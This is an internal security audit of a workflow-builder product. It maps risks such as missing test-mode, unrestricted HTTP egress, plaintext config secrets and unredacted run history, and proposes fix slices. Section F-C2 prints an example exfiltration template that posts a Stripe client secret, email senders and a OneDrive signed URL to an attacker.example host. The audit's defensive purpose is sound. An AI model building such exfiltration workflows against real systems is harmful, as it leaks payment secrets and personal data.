# Slice 3.SEC-1 — Workflow Builder Data Security + Cross-Node Data Flow Audit

**Status:** Audit only. No runtime, handler, or contract changes in this slice.
**Branch:** `v2-provider-port-local` (local-only; do not push).
**Date:** 2026-05-22.
**Scope reminder:** Map the risk surface. Do not fix anything. Recommended fixes ship as separate slices, each gated on Marcus approval.

---

## 1. Executive Summary

ChainReactV2's authorization and storage primitives are well-built: RLS is structural, OAuth tokens are AES-256-GCM encrypted, the service-role boundary is centralized at one helper, and the cron/webhook entry points have correct timing-safe signature verification. **The boundary that needs hardening before high-risk Stripe actions ship is the data-flow surface across nodes** — workflow config, variable picker, run outputs, and the lack of a test-mode / mock-mode in the engine.

**Top-line go / no-go:**

| Capability | Verdict | Why |
| --- | --- | --- |
| Ship Slack / Notion / Gmail metadata coverage as planned | **Go** | Read paths are RLS-correct; no money-moving handlers; trigger payload exposure is documented |
| Ship Stripe **read-only** actions (find / list / retrieve) | **Go with caveats** | Outputs already exclude full card data; webhook signature verification is strict; `client_secret` field exposure (see §4.1) is a follow-up |
| Ship Stripe **high-risk writes** (refunds, captures, subscription cancels, invoice finalize) | **NO-GO** | Engine has no test-mode; "Run-now" hits real APIs; meta has no `isDestructive`/`requiresConfirmation` flag; `client_secret` exposure unresolved. See §10 explicit no-go gates. |
| Continue building variable picker / config UX on existing OutputMeta | **Go** | But ship the `OutputMeta.sensitive` flag (§7.1) before connecting Stripe outputs to the picker, ideally before any new email / message provider lands |

**Five most consequential findings (ordered by severity × likelihood):**

1. **No test-mode in the V2 engine.** `services/execution/engine.ts` has zero `testMode` / `sandbox` / `dryRun` plumbing. The builder's `run-now` button hits real provider APIs. A user clicking "Run now" on a workflow with a Stripe refund node issues a real refund. **Blocks Stripe high-risk writes.**
2. **`http_request` is an unrestricted egress sink.** `integrations/native/actions/httpRequest.schema.ts` accepts any URL up to 2048 chars, any headers up to 8 KiB each, body up to 1 MiB. `integrations/native/actions/httpRequest.ts:24` acknowledges SSRF / private-network guards are deliberately deferred. Combined with the variable resolver passing any upstream output through string coercion, a workflow can exfiltrate Stripe customer emails, OneDrive signed download URLs, OAuth refresh-token-derived data, etc., to an attacker-controlled URL.
3. **Workflow config is stored as opaque `jsonb` with no encryption and no read-back masking.** `workflows.draft_definition` and `workflow_revisions.definition` are plaintext jsonb (`supabase/migrations/20260506000000_workflows.sql:28-46`). `WorkflowNodeSchema.config = z.record(z.string(), z.unknown())` (`contracts/workflowDefinition.ts:40`) accepts arbitrary keys. The HTTP action's `auth.token`, `auth.password`, and arbitrary `headers` map land here in plaintext. Revisions are immutable and never purged, so a leaked secret in a config field survives forever even after the user removes it from the draft.
4. **Run output storage persists full handler outputs and trigger payloads verbatim, indefinitely.** `workflow_runs.trigger_event` (jsonb) holds the raw webhook payload. `workflow_runs.steps[].output` (jsonb) holds every handler's return shape. `workflow_runs.steps[].error.message` holds raw error messages. The `GET /api/workflows/[id]/runs/[runId]` route returns all of these verbatim to the authenticated owner. No retention policy. No cron purge. Sample data shown in the builder's "RunResultsPanel" is unredacted JSON.
5. **OutputMeta has no sensitivity flag.** `contracts/actionMeta.ts:257-282` has no `sensitive` / `pii` / `secret` / `maskedInPreview` / `hiddenFromVariablePicker`. The variable picker (`features/workflow-builder/config-modal/fields/VariablePickerPopover.tsx`) renders every declared output and inlines latest-run previews. Gmail / Outlook trigger payloads (`from`, `to`, `body`, `snippet`), Slack message text, and Stripe `clientSecret` are all surfaced equivalently to non-sensitive ids.

The audit is structured so each finding has a verified file:line citation and a recommendation that's split out into a follow-up slice. Nothing in this slice should be implemented; §11 lists the follow-up slices in recommended order.

---

## 2. Audit Method

- Primary: read-only sweep of `contracts/`, `services/execution/`, `services/options/`, `services/notifications/`, `services/cron/`, `repositories/`, `app/api/`, `integrations/*/`, and `supabase/migrations/`.
- Reference rule files reviewed: [`docs/rules/database-security.md`](../../rules/database-security.md), [`docs/rules/variable-resolver.md`](../../rules/variable-resolver.md), [`docs/rules/workflow-builder-ui.md`](../../rules/workflow-builder-ui.md), [`docs/rules/workflow-state-store.md`](../../rules/workflow-state-store.md), [`docs/rules/workflow-lifecycle.md`](../../rules/workflow-lifecycle.md), [`docs/rules/oauth-dispatcher.md`](../../rules/oauth-dispatcher.md), [`docs/rules/webhook-receipt-routes.md`](../../rules/webhook-receipt-routes.md), [`docs/rules/token-ingest-auth.md`](../../rules/token-ingest-auth.md), [`docs/rules/provider-registry.md`](../../rules/provider-registry.md), [`docs/rules/testing-strategy.md`](../../rules/testing-strategy.md).
- Cross-checked claims against handler source for samples in Slack, Gmail, Outlook, Notion, GitHub, OneDrive, Stripe, and native HTTP.
- "Verified" = I read the file and the cited line(s) match. "Inferred" = pattern is reasonable but I did not exhaustively grep all callers. Marked explicitly.

---

## 3. Risk Table

Ranked by severity × exploit likelihood. Severity = `Critical | High | Medium | Low | Observation`.

| # | Risk | Sev | Verified | Recommended slice |
| --- | --- | --- | --- | --- |
| R1 | No engine test-mode; Run-now triggers real provider calls | Critical | Yes | SEC-2 (test-mode) |
| R2 | `http_request` accepts any URL/header/body; no SSRF/egress guard | Critical | Yes | SEC-3 (egress hardening) |
| R3 | Stripe high-risk writes lack `isDestructive`/`requiresConfirmation` meta flag | Critical | Yes | SEC-4 (action-risk metadata) |
| R4 | Workflow config + revisions store unencrypted plaintext jsonb; no read-back masking | High | Yes | SEC-5 (config secret handling) |
| R5 | Run history persists raw trigger + step outputs indefinitely; no redaction at API layer | High | Yes | SEC-6 (run output policy) |
| R6 | OutputMeta has no sensitivity flag; PII / secret outputs render identically to ids | High | Yes | SEC-7 (OutputMeta.sensitive) |
| R7 | Stripe `clientSecret` returned in PaymentIntent outputs, exposed in run outputs + variable picker | High | Yes | SEC-8 (Stripe client_secret) |
| R8 | OneDrive `downloadUrl` (signed, ~1h) emitted as plain string output; can flow to http_request | High | Yes | SEC-9 (FileRef/signed-URL audit) |
| R9 | `error.message` persisted verbatim before humanization; future channels could echo unsanitized text | Medium | Yes | SEC-10 (display-message split) |
| R10 | `capturePaymentIntent.amount_to_capture` accepts cents but no schema normalization; silent 1% capture possible if author confuses with `createPaymentIntent` (dollars) | Medium | Yes | SEC-11 (Stripe amount unit alignment) |
| R11 | Webhook-mode in test runs is impossible (no synthetic webhook generator); authors must Run-now with hand-crafted payloads, which feels safer than it is | Medium | Yes | SEC-2 covers |
| R12 | No `is_test` / `triggered_by` column on `workflow_runs`; post-mortem after an accidental real action is hard | Medium | Yes | SEC-2 covers |
| R13 | OAuth callback echoes provider-supplied `error` to query string; not persisted but appears in browser history and CDN logs | Low | Yes | SEC-12 (OAuth error sanitization) |
| R14 | No CSRF token; relies on Supabase httpOnly+SameSite cookie defaults | Low | Implicit | SEC-13 (CSRF posture check) |
| R15 | Stripe webhook events normalize and emit raw `livemode` flag; workflow author has no enforced isolation between test and live | Low | Yes | SEC-2 covers (engine flag), SEC-14 (Stripe livemode policy) |
| R16 | No team/workspace multi-tenancy yet; future migration adds risk surface | Observation | Yes | Track in tenant-scope slice |
| R17 | `workflow_runs` not exposed across users (RLS verified), but DB grows unbounded; cost/PII risk via legal hold | Observation | Yes | SEC-6 covers (retention) |

---

## 4. Findings by Severity

### 4.1 Critical

#### F-C1 — No test-mode / mock-mode in V2 engine

**Files:** [`services/execution/engine.ts`](../../../services/execution/engine.ts), [`services/execution/handlers/types.ts`](../../../services/execution/handlers/types.ts), [`app/api/workflows/[id]/run-now/route.ts`](../../../app/api/workflows/[id]/run-now/route.ts).

`WorkflowEngine.runWorkflow()` accepts no test flag. `ActionHandlerInput` has no `testMode` field. `workflow_runs` schema has no `is_test` / `mode` column. The `run-now` route enqueues a real run with a synthetic trigger payload, but everything after the trigger is real: handlers hit real APIs, real provider side effects fire, real money moves.

**Compare:** V1's CLAUDE.md describes a V1 engine-level pre-call gate at `nodeExecutionService.executeNode` that refuses to invoke external-action handlers when `context.testMode && isExternalAction(nodeType) && actionMode !== EXECUTE_ALL`. V2 has no equivalent.

**Impact:** Every dangerous handler runs unprotected in any user-initiated test. Examples present in V2 today: `slack:deleteMessage`, `stripe:createRefund`, `stripe:cancelSubscription`, `stripe:capturePaymentIntent`, `stripe:confirmPaymentIntent`, `microsoft-outlook:deleteEmail`, `gmail:deleteEmail` (if present), `microsoft-excel:deleteWorksheet`, `microsoft-excel:deleteRow`.

**Recommendation:** SEC-2 (see §11). MUST land before any high-risk Stripe action ships in the discovery registry.

#### F-C2 — `http_request` is unrestricted egress

**Files:** [`integrations/native/actions/httpRequest.schema.ts`](../../../integrations/native/actions/httpRequest.schema.ts), [`integrations/native/actions/httpRequest.ts`](../../../integrations/native/actions/httpRequest.ts) line 24 (explicit deferral comment), [`integrations/native/actions/httpRequest.meta.ts`](../../../integrations/native/actions/httpRequest.meta.ts).

Schema accepts any URL ≤2048 chars, any method, headers map (each value ≤8 KiB), body ≤1 MiB. Output exposes `body` (string, ≤256 KiB) and `bodyJson` (typed `unknown`). The handler intentionally filters sensitive response headers (`Set-Cookie`, `Authorization`, `Proxy-Authenticate`) — that part is good — but the **request side has no allowlist, denylist, SSRF check, private-IP guard, or audit log**.

**Composition risk:** combined with the variable resolver's permissive type coercion (F-C2.a below), any upstream output can be wired into URL, headers, or body:

```
url:   https://attacker.example/exfil
body:  {{stripe_create_payment.clientSecret}},{{gmail_new_email.from}},{{onedrive_get_file.downloadUrl}}
```

The resolver resolves all three references, concatenates them, the handler POSTs to attacker. No notification, no audit row.

**Sub-finding F-C2.a — variable resolver does not type-check upstream output type vs downstream FieldMeta type.** `workflow-engine/variables/resolveValue.ts` resolves `{{node.path}}` and returns the value as-is for single references; for mixed templates it `String(value)`s via `stringifyForMixed`. Nothing prevents a `fileRef`-typed output flowing into a `text`-typed config. The OutputMeta/FieldMeta type system is decorative, not enforced.

**Recommendation:** SEC-3 (egress allowlist / SSRF guard) before any production launch; SEC-7 (sensitive flag) reduces the upstream surface that's worth filtering.

#### F-C3 — Stripe high-risk writes have no action-level safety flag

**Files:** `contracts/actionMeta.ts:324-372` (ActionMetaSchema — no `isDestructive` / `requiresConfirmation` / `costEstimateUsd` field), and Stripe action handlers (`integrations/stripe/actions/createRefund.ts`, `cancelSubscription.ts`, `capturePaymentIntent.ts`, `confirmPaymentIntent.ts`).

Today every action is structurally equivalent in the builder library. A workflow author can drag in `stripe:createRefund` exactly like `slack:list_users`. The discovery registry does not surface the destructive-write distinction. Combined with F-C1 (no test-mode), a user "testing" a workflow that contains a refund node will issue a real refund.

The Stripe handlers DO have correct idempotency: `Idempotency-Key` derived from `runId+nodeId+actionType` on creates (refund, payment intent, subscription, invoice). Deletes / cancels skip the key because resource-id operations are server-side idempotent. That's correct — but idempotency protects against double-firing, not against a single incorrect first fire.

**Recommendation:** SEC-4 (add `isDestructive: boolean` + `requiresConfirmation: boolean` + optional `dangerCopy: string` to ActionMeta). SEC-2 (test-mode) reads these flags to decide which handlers to short-circuit.

### 4.2 High

#### F-H1 — Config stored as plaintext jsonb; revisions immutable

**Files:** [`supabase/migrations/20260506000000_workflows.sql`](../../../supabase/migrations/20260506000000_workflows.sql) lines 28-46 + 58-66, [`contracts/workflowDefinition.ts`](../../../contracts/workflowDefinition.ts) line 40, [`app/api/workflows/[id]/route.ts`](../../../app/api/workflows/[id]/route.ts) lines 57-86, [`app/api/workflows/_shared.ts`](../../../app/api/workflows/_shared.ts) lines 108-112.

`workflows.draft_definition` and `workflow_revisions.definition` are plaintext `jsonb`. `WorkflowNodeSchema.config = z.record(z.string(), z.unknown())` — fully opaque. Field-level Zod validation only runs at handler dispatch (per the rule doc), not at save. The PATCH `/api/workflows/[id]` route validates structural shape and accepts the rest as-is. The GET endpoint returns the full draft verbatim — no masking, no field-type-aware redaction.

What CAN be stored in plaintext today:
- `integrations/native/actions/httpRequest.schema.ts:57` — `auth.token: z.string().min(1).max(8192)`. Bearer tokens stored plaintext.
- Same file line 64 — `auth.password`. Basic-auth password plaintext.
- Same file line 71 — `headers` keyvalue map. `Authorization: Bearer sk-...` lives here.
- Arbitrary text/textarea fields in any action. Users can paste a Slack bot token, a Stripe secret key, an AWS key, a credit card number into the description of a Slack message or a Notion text field. No denylist runs.

`workflow_revisions` has SELECT + INSERT policies and no UPDATE — by design, revisions are immutable history. There is no purge cron. A leaked secret in revision N persists even after the user re-publishes a clean revision N+1.

**Sub-finding F-H1.a — read-back is unmasked.** Per `app/api/workflows/_shared.ts:108-112`, `toWorkflowDetail()` returns the full `draftDefinition` to the client. A workflow with stored bearer tokens ships them to the browser on every builder load. They're visible in browser memory and devtools.

**Recommendation:** SEC-5 (config secret handling): (a) decide canonical pattern — vault-reference indirection vs application-layer encryption of specific fields; (b) mask known-secret-shaped fields on read; (c) add a one-off purge tool for historical revisions on request.

#### F-H2 — Run history persists raw payloads + outputs, indefinitely, exposed to the owning user verbatim

**Files:** [`supabase/migrations/20260507000001_workflow_runs.sql`](../../../supabase/migrations/20260507000001_workflow_runs.sql), [`services/execution/engine.ts`](../../../services/execution/engine.ts) lines 343-358, [`app/api/workflows/[id]/runs/[runId]/route.ts`](../../../app/api/workflows/[id]/runs/[runId]/route.ts), [`app/api/workflows/_shared.ts`](../../../app/api/workflows/_shared.ts) lines 130-144, [`features/workflow-builder/panels/RunResultsPanel.tsx`](../../../features/workflow-builder/panels/RunResultsPanel.tsx) (per audit, "JSON pretty-print only — no inspector, no search, no redaction").

What's stored verbatim per run:
- `trigger_event` jsonb — full webhook payload (Stripe `payment_intent.succeeded` event, Slack message event, Gmail message metadata, etc.).
- `steps[].output` jsonb — every handler's full return shape (Slack message payload, Gmail message metadata, Stripe response objects including `clientSecret`).
- `steps[].error.message` — raw error string (could contain Slack API error text, Stripe error metadata, downstream HTTP response body).
- `fatal_error` jsonb — engine crash details.
- `error_classification` jsonb — humanized error (this one IS sanitized).

What's NOT stored:
- Resolved config (encouraging, since this would have included any token a user pasted into a field).
- Authorization headers, secrets in transit (engine logs are structural-only — `services/execution/engine.ts:107-115, 254-258, 345-349`).

What's NOT redacted:
- Run details API (`GET /api/workflows/[id]/runs/[runId]`) ships `triggerEvent`, `steps[].output`, `steps[].error.message`, `fatalError` to the client in full. RLS gates by `auth.uid() = user_id` (correct) but the owner sees everything.
- The builder's "Run Results" panel renders the JSON inline. Anyone shoulder-surfing or screen-sharing sees recipient emails, payment ids, etc.

What's NOT purged:
- No retention policy anywhere in `app/api/cron/`. `workflow_runs` grows forever (modulo workflow deletion cascade).

**Recommendation:** SEC-6 (run output redaction policy): combine with SEC-7 — when an OutputMeta field is marked sensitive, the API layer redacts the corresponding path in the response (replacing with `"[REDACTED]"` plus type hint). Add a retention cron (e.g., 90-day default, configurable per workspace).

#### F-H3 — OutputMeta has no sensitivity flag

**File:** [`contracts/actionMeta.ts`](../../../contracts/actionMeta.ts) lines 257-282.

Current `OutputMeta`: `{ name, type, description?, fields? }`. No way to mark a field as PII, secret, sensitive, payment-data, or "hide from variable picker."

Concrete outputs that should be marked but cannot be today:
- Gmail `newEmail.from`, `to`, `cc`, `bcc`, `subject`, `snippet`.
- Outlook `newEmail.body.content`, `from`, `to`, `cc`, `bodyPreview`.
- Slack `newMessageChannel.text`, `newDirectMessage.text`.
- GitHub `newCommit.pusher.email`, `head_commit.author.email`, `head_commit.message`.
- Stripe `createPaymentIntent.clientSecret` (see F-H4).
- Stripe `createCustomer.email`, `findCustomer.email` (PII).
- Stripe future `createRefund.charge.payment_method_details.card.last4` if surfaced.

**Recommendation:** SEC-7. Single boolean addition first (`sensitive: boolean`), refine later if classifications matter for UX. See §7.1 for the proposed contract addition.

#### F-H4 — Stripe `clientSecret` exposed in PaymentIntent outputs

**Files:** [`integrations/stripe/actions/createPaymentIntent.ts`](../../../integrations/stripe/actions/createPaymentIntent.ts) line 62, [`integrations/stripe/actions/createPaymentIntent.meta.ts`](../../../integrations/stripe/actions/createPaymentIntent.meta.ts) lines 93-96 (meta documents it as "safe to send to the client"), [`integrations/stripe/actions/confirmPaymentIntent.ts`](../../../integrations/stripe/actions/confirmPaymentIntent.ts) line 43.

Stripe's documentation does say `client_secret` is intended for the frontend Payment Element. That's true for browser usage. In a server-side workflow engine, the `clientSecret` (a) gets persisted into `workflow_runs.steps[].output.clientSecret`, (b) becomes a draggable variable in the builder picker, (c) can be wired into `http_request` body or headers by an untrusted workflow author.

**Possession of a `client_secret` lets the holder confirm a PaymentIntent through Stripe.js without further auth.** It's not as bad as a secret API key, but treating it as plain output is wrong — it should be marked sensitive at minimum, and arguably not exposed as a workflow output at all (the workflow that creates the PaymentIntent and the workflow that confirms it on a client surface are different concerns).

**Recommendation:** SEC-8: either drop `clientSecret` from the output (deliver to the client via the user's own surface) or mark it `sensitive: true` once SEC-7 ships and force-redact in run history.

#### F-H5 — OneDrive `downloadUrl` is a signed URL emitted as plain string

**File:** [`integrations/microsoft-onedrive/actions/getFile.ts`](../../../integrations/microsoft-onedrive/actions/getFile.ts) line 47 (`downloadUrl: result["@microsoft.graph.downloadUrl"] ?? null`).

This is a pre-signed URL (Microsoft Graph `@microsoft.graph.downloadUrl`, valid for ~1 hour, no auth required). Anyone with the URL can download the file for that window. Today it's emitted as a `string` output, persisted into run history, and can be wired into any `text` field downstream — including `http_request.url` (SSRF or exfil to attacker), `http_request.body` (leaks to attacker), Slack message text (logged in Slack workspace), Gmail send body (delivered to recipient).

**Compare:** the FileRef contract (`contracts/file.ts`) is otherwise rigorous: `signed_url` arm includes `expiresAt`, `provider_url` arm clearly notes provider-bearer-bound. Slack `downloadFile` and Gmail `getAttachment` correctly stage through `v2_storage`, never emit raw provider URLs. OneDrive's `downloadUrl` is the exception.

**Recommendation:** SEC-9: either reshape `microsoft-onedrive:getFile` output to a `FileRef` (consistent with Slack/Gmail), or mark `downloadUrl` sensitive and ensure SEC-7 redaction applies. Audit every action handler for similar signed-URL leaks.

### 4.3 Medium

#### F-M1 — `error.message` persisted before humanization

**File:** [`services/execution/engine.ts`](../../../services/execution/engine.ts) lines 248-269, 351-358.

Engine writes `(err as Error).message` verbatim into `workflow_runs.steps[].error.message`. The humanizer at [`core/errors/humanizeActionError.ts`](../../../core/errors/humanizeActionError.ts) runs AFTER, producing `error_classification` for notifications and the run summary UI. The raw message is preserved for debugging and is visible to the owner via the runs detail API.

Slack errors are pre-sanitized (`integrations/slack/api/errors.ts:11-18` always formats as `"Slack API failed: <code>"`). Stripe errors are NOT explicitly sanitized — if the Stripe SDK throws an error whose `.message` includes request body context, it would land in run history. Verified Stripe handlers do throw structured errors but I did not exhaustively trace every Stripe error path.

**Recommendation:** SEC-10 — split into `error.message` (engineer-facing, can stay structured) + `error.displayMessage` (humanized, used by all UI / channel surfaces); ensure future email / Slack DM channels never echo `error.message`.

#### F-M2 — `capturePaymentIntent.amount_to_capture` is cents while `createPaymentIntent.amount` is dollars

**File:** [`integrations/stripe/actions/capturePaymentIntent.schema.ts`](../../../integrations/stripe/actions/capturePaymentIntent.schema.ts) (per audit), schema accepts cents as a V1 wire-format passthrough.

If a workflow author wires `{{stripe_create.amount}}` (cents, per `createPaymentIntent`'s output) into `capturePaymentIntent.amount_to_capture` — works correctly. If the author types `5.00` into the capture field expecting dollars (per create's INPUT format) — captures 5 cents silently. The schema notes the wire-format quirk loudly in JSDoc but provides no normalization.

**Recommendation:** SEC-11 — normalize at the schema layer; both fields take dollars at the user-facing layer; conversion to cents happens in the handler. Bring Stripe action surface into consistency.

#### F-M3 — No `is_test` / `triggered_by` column on `workflow_runs`

**File:** [`supabase/migrations/20260507000001_workflow_runs.sql`](../../../supabase/migrations/20260507000001_workflow_runs.sql).

No way to query "show me every test run for user X in the past week" or "show me the runs that originated from Run-now vs webhook." After an accidental real-money action, post-mortem is hand-traced through `trigger_event.provider` + `trigger_event.eventType` heuristics.

**Recommendation:** Folded into SEC-2 (test-mode lands `is_test bool not null default false` on `workflow_runs`). Adding `triggered_by enum('webhook'|'manual'|'scheduled'|'retry')` in the same migration is a small, low-risk addition.

### 4.4 Low

#### F-L1 — OAuth callback echoes provider `error` to query string

**File:** [`app/api/integrations/oauth/[provider]/callback/route.ts`](../../../app/api/integrations/oauth/[provider]/callback/route.ts) lines 33-39 and 55-59.

`?integration_error=<URL-encoded provider error>` lands in the user's URL, persisted to browser history. Standard OAuth error codes (`invalid_scope`, `access_denied`, `server_error`) are safe. A malicious or buggy provider could craft a long error_description containing user-identifying data; that string would appear in browser history, network captures, and any CDN access log.

**Recommendation:** SEC-12 — allowlist a small set of OAuth error codes; map everything else to `callback_failed` server-side and surface details only via a server-rendered explanation page.

#### F-L2 — No explicit CSRF token

**Files:** `middleware.ts`, `utils/supabase/middleware.ts`, Next.js + Supabase SSR defaults.

State-changing API routes rely on the Supabase httpOnly auth cookie. SameSite=Lax is the Supabase default. There is no explicit Origin / Referer / CSRF-token check.

**Recommendation:** SEC-13 — confirm SameSite policy in deployed environments; if not Strict, add explicit Origin check on state-changing routes.

#### F-L3 — Stripe `livemode` policy unenforced

**File:** Stripe webhook normalizer (per audit).

`livemode` boolean is present in Stripe response objects and can be branched on in the condition layer, but the engine doesn't enforce "test-mode workflow = test Stripe key required" or vice versa. Folded into SEC-2 (test-mode) + a Stripe-specific SEC-14 (require Stripe test connection for non-production workflows).

### 4.5 Observations (Not yet a risk)

- **No team / workspace multi-tenancy.** Slice 1 is user-scoped. The team-membership template at `docs/rules/database-security.md:96-102` is ready when teams land. Tracking note only.
- **DB grows unbounded.** Even without sensitive data, `workflow_runs` will accumulate indefinitely. Costs $$ and increases PII surface in case of legal hold. SEC-6 should cover.

---

## 5. What's Safe Today

The audit found several primitives in good shape. Future slices should treat these as "do not regress":

| Area | Why it's safe | File / line |
| --- | --- | --- |
| RLS coverage | Every user-data table has `ENABLE ROW LEVEL SECURITY` + at least one policy in the SAME migration. CI lint at `scripts/check-migration-rls.mjs` enforces. | All migrations under `supabase/migrations/` |
| Service-role centralization | Single helper at `repositories/supabase/serviceRoleClient.ts:16-38` with a mandatory `reason` string. Structure test `tests/structure/no-service-role-imports.test.ts` blocks client-bundle leakage. | Verified |
| OAuth token encryption | AES-256-GCM via `core/encryption/tokens.ts:64-82`. Tokens encrypted before insert at `repositories/integrations.ts:145`. Decrypt failures throw a generic `DecryptionFailedError` that never logs the ciphertext. | Verified |
| Cron auth | Timing-safe Bearer compare via `services/cron/auth.ts:40-66` (`crypto.timingSafeEqual`). | Verified |
| Webhook signature verification | Strict-direct-lookup pattern, raw body preserved before parsing, HMAC over raw bytes, expired timestamps (>300s) rejected. No V1-style "try every active secret" fallback. | `services/slack/webhooks/receive.ts:86` and Stripe webhook receiver |
| OptionsSource scoping | Resolvers receive `{userId, integration}` from `getActiveForExecution(auth.userId, provider, null)`. No cross-user data leak via dynamic options. | `app/api/options/[source]/route.ts:99-194` |
| Engine logs are structural | `services/execution/engine.ts` logs only `{event, nodeId, provider, type, code}` — never resolved config, never handler output, never auth headers. | Verified |
| Resolved config is NOT persisted | Engine stores `result.output` per step but NOT the resolved config that produced it. Tokens pasted into config fields flow through memory only at runtime — they don't appear in run history. | `services/execution/engine.ts:343-344` |
| FileRef contract is rigorous | Discriminated union (`provider_url` / `signed_url` / `v2_storage`); strict schema rejects inline `bytes`/`base64`/`content`. Outlook send-email handler enforces 3 MB / 25 MB attachment caps. | `contracts/file.ts` |
| Handler outputs are explicitly constructed | Sampled Slack `downloadFile`, Gmail `getAttachment`, OneDrive `getFile` (mostly), Outlook `sendEmail`, GitHub commit handler. None spread `{...providerResponse}` at the output root. | Spot-checked |
| Notification orchestrator uses humanized error only | `services/notifications/buildWorkflowFailurePayload.ts:17-26` builds from `error_classification`, not raw `error.message`. Dedup gate fires once per run. | Verified |
| Token decrypt failure is generic | `DecryptionFailedError` never embeds the encrypted blob. | `core/encryption/tokens.ts:64-82` |

---

## 6. What's Unknown / Not Verified in This Audit

The following deserve a deeper look in a follow-up slice or before going to production. Listed honestly so reviewers can target them:

- **Every Stripe API error path.** Spot-checked the SDK error surface; did not exhaustively map every place where the Stripe Node SDK might attach a verbatim provider message to an error. Recommend reading every `try/catch` around a Stripe API call.
- **CSRF posture in deployed environments.** SameSite cookie defaults need to be confirmed against the actual Supabase project config and any CDN / proxy edge config. The code-level posture is "implicit, relies on httpOnly+SameSite."
- **Logging configuration in production.** The engine emits structural-only logs. The deployed log sink (Vercel, Logflare, etc.) was not inspected. If a production log line is routed somewhere with broader access, the structural metadata could still be leveraged.
- **Total `.meta.ts` coverage of object outputs.** Verified high-value triggers (Gmail, Outlook, Slack, GitHub) and a sample of actions. A full sweep of every `type: "object"` output with no `fields[]` declared is ~18 metas per the metadata-safety audit — not enumerated here individually.
- **Stripe Connect account selection in edge cases.** `accountId` resolution is correct for Stripe-triggered workflows. For cross-provider workflows that target a specific Stripe account, the lookup falls back to the user's single Stripe integration row — multi-account users could have ambiguous routing. Not exploited today (Stripe isn't fully shipped), but flag for the Stripe go-live slice.
- **`scripts/check-migration-rls.mjs` exact rule set.** Confirmed it exists and enforces RLS+policy. Did not test corner cases (e.g., a table named `_temp_` or with a non-standard `public.` schema prefix).
- **Backup / restore PII surface.** If Supabase point-in-time-restore snapshots contain `workflow_runs` from before a redaction lands, restoration would re-introduce historical PII. Operational concern, not code-level.

---

## 7. Recommended Contract Changes

Each addition is minimal, additive, and backwards-compatible. Each ships in its own slice — they're listed here so reviewers can see the destination shape.

### 7.1 `OutputMeta.sensitive: boolean`

**Change:** Add one optional boolean to `OutputMeta` (and the recursive `fields[]`).

```typescript
// contracts/actionMeta.ts
export interface OutputMeta {
  name: string;
  type: OutputType;
  description?: string;
  fields?: readonly OutputMeta[];
  /**
   * Marks this output (or nested field) as sensitive: PII, secrets, signed URLs,
   * payment-data hints, message bodies. Consumers MUST:
   *   - Redact in run-details API responses (replace value with "[REDACTED]" + type hint)
   *   - Visually distinguish in the variable picker (warning chip)
   *   - Refuse to render in latest-run preview tiles
   * Default: false (omitted).
   */
  sensitive?: boolean;
}
```

**Why one flag, not four:** the audit considered `pii` / `secret` / `maskedInPreview` / `hiddenFromVariablePicker`. The behavioral difference between "PII" and "secret" doesn't manifest in any current consumer; both want the same treatment (mask, warn, never log). `maskedInPreview` and `hiddenFromVariablePicker` are implementation details, not properties of the data. A single boolean keeps the consumer code simple. If real UX differentiation emerges (e.g., "PII you can show in workspace admin tools, secret you never can"), refine later.

**Followups:** annotate the canonical sensitive outputs (~22 high-risk per the metadata-safety inventory) in the same slice or a quick follow-up.

### 7.2 `ActionMeta.isDestructive: boolean` + `requiresConfirmation: boolean`

```typescript
// contracts/actionMeta.ts (additions to ActionMetaSchema)
isDestructive: z.boolean().default(false),
requiresConfirmation: z.boolean().default(false),
```

**Semantics:**
- `isDestructive: true` — action causes irreversible or hard-to-reverse provider-side side effects (refund, delete, cancel, capture, send). Used by SEC-2 test-mode gate to decide which handlers to mock.
- `requiresConfirmation: true` — builder UI surfaces a confirmation step before a user can drag this action into a workflow or before a manual Run-now executes. Independent of `isDestructive` (a destructive action may not need confirmation in some flows; some non-destructive actions may want confirmation for product reasons).

Stripe writes, Gmail/Outlook delete-message, Slack delete-message, Excel delete-worksheet all set `isDestructive: true`. Stripe refunds + payment captures + subscription cancels additionally set `requiresConfirmation: true`.

### 7.3 (Deferred) `OutputMeta.fields[]` adoption

The contract already supports nested drillable outputs via `fields?: readonly OutputMeta[]`. Today, zero metas populate it (per the variable-picker audit). When Stripe outputs surface nested shapes (`charge.payment_method_details.card.last4`), they SHOULD use `fields[]` with `sensitive: true` on individual nested fields — not a top-level `card: object` opaque. Track as a follow-up to SEC-7.

### 7.4 (Deferred) `is_test` + `triggered_by` columns on `workflow_runs`

Migration column additions belonging to SEC-2.

---

## 8. Recommended Implementation Slices

Ordered by **dependency** (top first) and **value**. Each is its own PR.

| Slice | Title | Depends on | Why |
| --- | --- | --- | --- |
| **SEC-2** | Engine test-mode + workflow_runs `is_test` + `triggered_by` columns | — | Hard gate before any high-risk Stripe action. Engine pre-call check refuses external-write handlers when `testMode && isDestructive`. Builder gains explicit "Test" button (mocked) vs "Run now" (real). |
| **SEC-4** | `ActionMeta.isDestructive` + `requiresConfirmation` flags | — | Pure contract addition. SEC-2 consumes; builder UI warns. Backfill the flag for every existing destructive handler in the same PR. |
| **SEC-7** | `OutputMeta.sensitive` flag + redaction in run-details API + variable-picker warning chip | — | Pure contract + UI + API change. Includes annotating the ~22 sensitive outputs identified in the metadata-safety audit. |
| **SEC-3** | `http_request` egress hardening | — | Required before Stripe ships. Add: URL allowlist or denylist (block private IPs, link-local, metadata services), per-workflow egress audit log, max-body restrictions. Could be staged: first land denylist (SSRF guard), later add allowlist for production-paranoid users. |
| **SEC-8** | Stripe `clientSecret` exposure decision | SEC-7 | Choose: (a) drop from output entirely (frontend flows pick up via Stripe SDK on the client), or (b) mark `sensitive: true` and never include in webhook callbacks. Recommend (a) unless a concrete workflow use case needs it. |
| **SEC-5** | Workflow config secret handling | SEC-7 | Decide canonical pattern. Two options: (a) field-level encryption (declare a field as `secret: true` in meta; engine encrypts at save, decrypts at handler dispatch); (b) vault-reference indirection (config stores `${vault:my-stripe-key}` references; vault resolved at runtime). Audit recommends (b) — it's the V1 lesson + matches industry standard (Zapier "Connections," n8n "Credentials"). |
| **SEC-6** | Run output redaction policy + retention cron | SEC-7 | Two parts: (a) API-layer redaction driven by OutputMeta.sensitive; (b) retention cron — 90-day default, configurable per workspace, with hard-delete of fields marked sensitive and structural-only retention beyond. |
| **SEC-9** | FileRef + signed-URL audit | SEC-7 | Reshape `microsoft-onedrive:getFile.downloadUrl` to a FileRef. Sweep every output for similar signed-URL emissions across OneDrive, Google Drive (if added), Dropbox (if added). |
